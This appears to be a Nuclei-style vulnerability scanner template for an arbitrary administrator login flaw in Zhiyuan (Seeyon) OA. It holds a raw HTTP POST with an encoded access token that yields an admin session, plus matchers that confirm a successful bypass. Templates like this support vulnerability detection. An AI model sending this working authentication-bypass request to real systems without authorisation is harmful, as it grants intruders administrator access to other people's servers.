id: zhiyuan-oa-arbitrary-admin-login
info:
  name: Zhiyuan OA Arbitrary Admin Login
  author: ProjectDiscoveryAI
  severity: high
  tags: zhiyuan-oa, admin-login
  description: |
    Zhiyuan OA arbitrary administrator login vulnerability.

http:
  - raw:
      - |
        POST /seeyon/thirdpartyController.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "JSESSIONID"
      - type: word
        part: body
        words:
          - "/seeyon/doc.do?method=docHomepageIndex&docResId=&_isModalDialog=true&openFrom="
